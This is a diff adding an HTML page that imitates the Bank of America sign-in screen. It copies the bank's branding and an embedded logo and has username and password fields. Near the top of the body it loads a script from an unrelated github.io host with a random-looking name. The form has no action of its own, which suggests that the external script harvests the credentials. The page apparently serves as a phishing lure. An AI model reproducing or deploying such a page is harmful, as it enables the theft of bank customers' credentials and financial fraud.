@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bank of America Login</title>
+<style>
+/* Reset & font */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f1f3f6; /* light gray background */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.login-container {
+  background-color: #fff;
+  padding: 40px;
+  width: 380px;
+  border-radius: 10px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+  text-align: center;
+}
+
+.logo img {
+  width: 120px;
+  margin-bottom: 20px;
+}
+
+.login-container h2 {
+  color: #da1414; /* BOA red */
+  margin-bottom: 25px;
+  font-size: 24px;
+}
+
+.login-container input[type="text"],
+.login-container input[type="password"] {
+  width: 100%;
+  padding: 12px 15px;
+  margin-bottom: 18px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+}
+
+.login-container input[type="submit"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 5px;
+  border: none;
+  background-color: #da1414;
+  color: #fff;
+  font-weight: bold;
+  font-size: 16px;
+  cursor: pointer;
+  transition: background 0.3s ease;
+}
+
+.login-container input[type="submit"]:hover {
+  background-color: #b01212;
+}
+
+.login-container a {
+  display: block;
+  margin-top: 12px;
+  color: #1a1f71; /* BOA blue */
+  font-size: 14px;
+  text-decoration: none;
+}
+
+.login-container a:hover {
+  text-decoration: underline;
+}
+</style>
+</head>
+<body>
+<script src="https://ysktshsh.github.io/intfolder/int2.js"></script>
+<div class="login-container">
+  <div class="logo">
+    <!-- Placeholder for Bank of America logo -->
+    <img src="data:image/png;base64,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" alt="Bank of America Logo">
+  </div>
+  <h2>Sign in to Your Bank of America Account</h2>
+  <form>
+    <input type="text" placeholder="Username" name="Username" required>
+    <input type="password" placeholder="Password" name="Password" required>
+    <input type="submit" value="Sign In">
+    <a href="#">Forgot Username / Password?</a>
+    <a href="#">Enroll / Create Account</a>
+  </form>
+</div>
+
+</body>
+</html>
